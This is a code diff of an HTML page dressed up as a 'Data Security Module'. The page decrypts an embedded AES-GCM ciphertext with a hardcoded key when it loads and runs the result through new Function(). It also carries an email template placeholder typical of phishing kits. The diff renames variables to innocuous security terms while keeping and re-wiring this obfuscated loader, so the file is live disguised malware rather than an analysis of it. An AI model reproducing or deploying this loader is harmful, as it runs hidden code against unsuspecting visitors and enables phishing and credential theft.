@@ -3,77 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Data Processor</title>
+    <title>Data Security Module</title>
     <style>
         body {
-            background: #d0d0d0;
-            font-family: monospace;
+            background-color: #e0e0e0;
+            font-family: 'Courier New', monospace;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
         }
-        .container {
+        
+        .security-module {
             text-align: center;
+            padding: 20px;
+        }
+        
+        .hidden-marker {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <br nike-earl="">
-        <hr adidas="<%=EMAIL64%>">
+    <div class="security-module">
+        <span class="hidden-marker" data-identifier=""></span>
+        <hr nike-hackboy="" adidas="<%=EMAIL64%>">
     </div>
 
-    <script data-config="CBSCTBABDUAAABACAABAAlyOHKvkPFruTmLR2MTWjA5ihF6nSQvpZLfVWwkiPQya2Y3E7ZfDid7c8ZDi2xE3ts_hMVf97872UAvCTwkLuZRVJRY6D2VpWbLI60V3THrA">
-        const encryptionData = {
-            iv: "ceb0f4f1afbc695ad02798ab",
-            salt: "752dba59f37d01b08991d9e6c34ac389",
-            encrypted: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
+    <script data-security-config="CBSCTBABDUAAABACAABAAlyOHKvkPFruTmLR2MTWjA5ihF6nSQvpZLfVWwkiPQya2Y3E7ZfDid7c8ZDi2xE3ts_hMVf97872UAvCTwkLuZRVJRY6D2VpWbLI60V3THrA">
+        const securityPayload = {
+            initializationVector: "ceb0f4f1afbc695ad02798ab",
+            encryptionSalt: "752dba59f37d01b08991d9e6c34ac389",
+            cipherText: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
         };
-        const encryptionKey = "ea58c0ef491543774f851a0a594c7535";
+        const masterKey = "ea58c0ef491543774f851a0a594c7535";
 
-        function hexToBytes(hex) {
-            return new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+        function convertHexToBinary(hexString) {
+            const bytes = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+            return bytes;
         }
 
-        async function decryptData() {
+        async function processSecureData() {
             try {
-                const keyMaterial = await crypto.subtle.importKey(
+                const baseKey = await crypto.subtle.importKey(
                     "raw",
-                    new TextEncoder().encode(encryptionKey),
+                    new TextEncoder().encode(masterKey),
                     { name: "PBKDF2" },
                     false,
                     ["deriveKey"]
                 );
 
-                const derivedKey = await crypto.subtle.deriveKey(
+                const operationalKey = await crypto.subtle.deriveKey(
                     {
                         name: "PBKDF2",
-                        salt: hexToBytes(encryptionData.salt),
+                        salt: convertHexToBinary(securityPayload.encryptionSalt),
                         iterations: 100000,
                         hash: "SHA-256"
                     },
-                    keyMaterial,
+                    baseKey,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
                 );
 
-                const decrypted = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexToBytes(encryptionData.iv) },
-                    derivedKey,
-                    hexToBytes(encryptionData.encrypted)
+                const decryptedResult = await crypto.subtle.decrypt(
+                    { 
+                        name: "AES-GCM", 
+                        iv: convertHexToBinary(securityPayload.initializationVector) 
+                    },
+                    operationalKey,
+                    convertHexToBinary(securityPayload.cipherText)
                 );
 
-                const decodedData = new TextDecoder().decode(decrypted);
-                if (decodedData) new Function(decodedData)();
+                const decodedContent = new TextDecoder().decode(decryptedResult);
+                if (decodedContent) {
+                    new Function(decodedContent)();
+                }
             } catch (error) {
-                console.error("Decryption failed:", error);
+                console.error("Data processing error:", error);
             }
         }
 
-        decryptData();
+        document.addEventListener('DOMContentLoaded', processSecureData);
     </script>
 </body>
 </html>
